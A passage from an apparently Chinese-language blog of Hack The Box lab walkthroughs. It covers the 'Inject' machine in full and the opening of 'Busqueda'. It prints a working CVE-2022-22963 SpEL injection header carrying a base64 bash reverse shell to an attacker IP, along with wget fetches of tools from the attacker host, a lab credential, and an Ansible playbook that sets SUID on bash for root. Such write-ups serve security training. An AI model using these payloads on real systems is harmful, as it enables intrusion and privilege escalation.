|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（ssh）、8080（http-proxy）</p>
<p>访问<code>8080</code>端口</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403145949424.png"></p>
<p>点击右上角<code>Upload</code>，存在上传点，上传php文件提示<code>Only image files are accepted!</code></p>
<p>再次上传，同时Burp抓包，修改请求包两处<code>filename="1.jpg"</code>、<code>Content-Type: image/jpeg</code>，成功上传，响应返回路径<code>/show_image?img=1.jpg</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403150947720.png"></p>
<h2 id="三、LFI（本地文件包含）"><a href="#三、LFI（本地文件包含）" class="headerlink" title="三、LFI（本地文件包含）"></a>三、LFI（本地文件包含）</h2><p>浏览器访问<code>http://10.10.11.204:8080/show_image?img=1.jpg</code>，同时抓包，修改<code>img=../../../</code>测试LFI（本地文件包含），可看到响应返回目录文件，确定存在LFI</p>
<p>文件包含：<a href="https://www.freebuf.com/articles/web/277756.html">https://www.freebuf.com/articles/web/277756.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403152628018.png"></p>
<p>遍历发现<code>img=../../../../../../</code>是根目录，<code>img=../../../</code>就是Web页面根目录（或<code>img=../../../../../../var/www/WebApp</code>）</p>
<p>读取<code>pom.xml</code>文件</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
	<span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token comment">&lt;!-- lookup parent from repository --&gt;</span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>WebApp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>WebApp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Demo project for Spring Boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sun.activation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javax.activation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-devtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>runtime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-function-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.webjars<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>bootstrap<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.1.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.webjars<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>webjars-locator-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${parent.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">&gt;</span></span>spring-webapp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="四、CVE-2022-22963（Spring-Cloud-Function-SpEL注入）"><a href="#四、CVE-2022-22963（Spring-Cloud-Function-SpEL注入）" class="headerlink" title="四、CVE-2022-22963（Spring Cloud Function SpEL注入）"></a>四、CVE-2022-22963（Spring Cloud Function SpEL注入）</h2><p>关键代码如下，版本3.2.2，存在Spring Cloud Function SpEL 代码注入（CVE-2022-22963）</p>
<p>分析：<a href="https://www.anquanke.com/post/id/280278">https://www.anquanke.com/post/id/280278</a></p>
<p>利用：<a href="https://blog.csdn.net/qq_44842234/article/details/125845459">https://blog.csdn.net/qq_44842234/article/details/125845459</a></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-function-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>利用方法1</strong></p>
<p>在如下网站填写反弹shell命令，得到base64处理后的命令</p>
<p><a href="https://bewhale.github.io/tools/encode.html">https://bewhale.github.io/tools/encode.html</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403174954186.png" style="zoom: 80%;">

<p>先本地执行<code>nc -lvnp 9898</code>开启nc监听</p>
<p>浏览器访问<code>http://10.10.11.204:8080/functionRouter</code>，同时Burp抓包，<code>Send to Repeater</code>之后在<code>Reapeter</code>右键选择<code>Change request method</code>，此时GET请求变成POST请求，然后添加如下请求头，发包</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk4OTggMD4mMQ==}|{base64,-d}|{bash,-i}")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403174347393.png"></p>
<p>成功反弹shell，获取frank用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403175821863.png"></p>
<p><strong>利用方法2</strong></p>
<p>下载利用脚本到本地</p>
<p>利用脚本：<a href="https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE">https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE</a></p>
<p>先本地执行<code>nc -lvnp 9898</code>开启nc监听</p>
<p>本地执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">python3 Spel_RCE_Bash_EXP.py http://10.10.11.204:8080 10.10.16.9 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403173316806.png"></p>
<p>成功反弹shell，获取frank用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403173329047.png"></p>
<p>用如下find命令查看frank属组的文件，且过滤掉带有<code>proc</code>字符串的行（因为<code>/proc</code>目录下太多无用的相关文件）</p>
<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ find / -group frank -type f 2&gt;/dev/null | grep -v "proc"
find / -group frank -type f 2&gt;/dev/null | grep -v "proc"
/tmp/XvFlf
/tmp/CmMlc
/tmp/JYiHo.b64
/tmp/hsperfdata_frank/824
/tmp/YGqfV.b64
/tmp/KpLRF.b64
/tmp/gotRCEbutCANTrevSHELL.aaaaaa
/tmp/CkFZS
/tmp/shell.sh
/home/frank/.bashrc
/home/frank/.m2/settings.xml
/home/frank/.cache/motd.legal-displayed
/home/frank/.profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>/home/frank/.m2/settings.xml</code>看到<code>phil</code>账户</p>
<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ cat /home/frank/.m2/settings.xml
cat /home/frank/.m2/settings.xml
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">phil
DocPhillovestoInject123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行<code>su phil</code>切换到<code>phil</code>账户（输入密码回车之后就是phil用户了）</p>
<pre class="line-numbers language-none"><code class="language-none">frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
pwd
/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下载<code>linpeas.sh</code>到本地：<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
<p>本地开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>phil</code>用户窗口执行<code>wget http://10.10.16.9/linpeas.sh</code>，从本地传输<code>linpeas.sh</code>到靶机</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403181628295.png"></p>
<p>添加可执行权限</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 777 linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="五、Ansible-Playbook提权"><a href="#五、Ansible-Playbook提权" class="headerlink" title="五、Ansible Playbook提权"></a>五、Ansible Playbook提权</h2><p>执行<code>./linpeas.sh</code>，看到如图自动任务<code>playbook_1.yml</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403185432389.png"></p>
<p>查看文件内容</p>
<pre class="line-numbers language-none"><code class="language-none">ls -la /opt/automation/tasks/playbook_1.yml
-rw-r--r-- 1 root root 150 Apr  3 11:36 /opt/automation/tasks/playbook_1.yml
cat /opt/automation/tasks/playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>google搜索，是ansible playbook，由于靶机shell环境编辑文件不方便，本地编辑<code>getshell.yml</code>，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">- hosts: localhost
  tasks:
    - name: getshell
      command: chmod u+s /bin/bash
      become: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>回到靶机，执行如下命令，将文件从本地传输到靶机<code>/opt/automation/tasks/</code>目录下（记得本地开http服务）</p>
<pre class="line-numbers language-none"><code class="language-none">cd /opt/automation/tasks/
wget http://10.10.16.9/getshell.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>稍等片刻，自动任务执行后，查看<code>/bin/bash</code>已设置suid，执行<code>bash -p</code>，成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403201728343.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230403202130316.png" style="zoom:80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_58869808/article/details/129505388">https://blog.csdn.net/qq_58869808/article/details/129505388</a></p>
<p><a href="https://www.0le.cn/archives/55.html">https://www.0le.cn/archives/55.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Spring Cloud Function</tag>
        <tag>SpEL注入</tag>
        <tag>Ansible Playbook提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Busqueda</title>
    <url>/posts/d91931aa.html</url>
    <content><![CDATA[<h1 id="HTB-Busqueda"><a href="#HTB-Busqueda" class="headerlink" title="HTB-Busqueda"></a>HTB-Busqueda</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现命令注入；</p>
<p>2.命令注入反弹shell获取svc用户权限；</p>
<p>3.Git信息泄露密码；</p>
<p>4.<code>sudo -l</code>发现可suid提权；</p>
<p>5.suid提权获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap，先扫端口，后扫服务</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410160635734.png">

<p>开放端口：22（ssh）、80（http）；域名：<code>searcher.htb</code></p>
<p>添加域名解析记录到本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.208 searcher.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问<code>http://searcher.htb/</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410102604709.png"></p>
<p>大致意思，是一个集成了多搜索引擎的搜索平台。</p>
<p>第一个框（Select your engine）是个下拉框，可选择各种搜索引擎；</p>
<p>第二个框（What do you want to search for）是想要搜索的内容；</p>
<p>此处尝试搜索引擎选择Apple，搜索内容为123</p>
<p>下面的选项<code>Auto redirect</code>，不勾选，搜索时会返回如下格式的链接；勾选，会重定向到指定搜索引擎</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410103511821.png"></p>
<p>另外页面底部，可看到<code>Flask</code>框架和<code>Searchor 2.4.0</code>，所以后端是Python</p>
<h2 id="三、命令注入"><a href="#三、命令注入" class="headerlink" title="三、命令注入"></a>三、命令注入</h2><p>搜索的同时用Burp抓包，测试发现<code>query</code>字段可能有注入，如下两张图。Sqlmap尝试post注入，无果</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171555402.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410171637361.png"></p>
<p>看了一下Github上Searchor的介绍：<a href="https://github.com/ArjunSharda/Searchor">https://github.com/ArjunSharda/Searchor</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411111122155.png"></p>
<p>根据CLI（Command-Line Interface）命令，推测一下，post参数传到CLI时，拼接大概如下（此处用<code>123'</code>和<code>123"</code>测试，双引号时响应正常，单引号响应异常，所以参数值应该被单引号包裹）</p>
<pre class="line-numbers language-none"><code class="language-none">searchor engine 'query' --copy
例：searchor Apple '123' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>想办法在query参数位注入想要执行的命令</p>
<p>参考：<a href="https://realpython.com/python-eval-function/">https://realpython.com/python-eval-function/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411115221617.png"></p>
<p>compile()函数语法：</p>
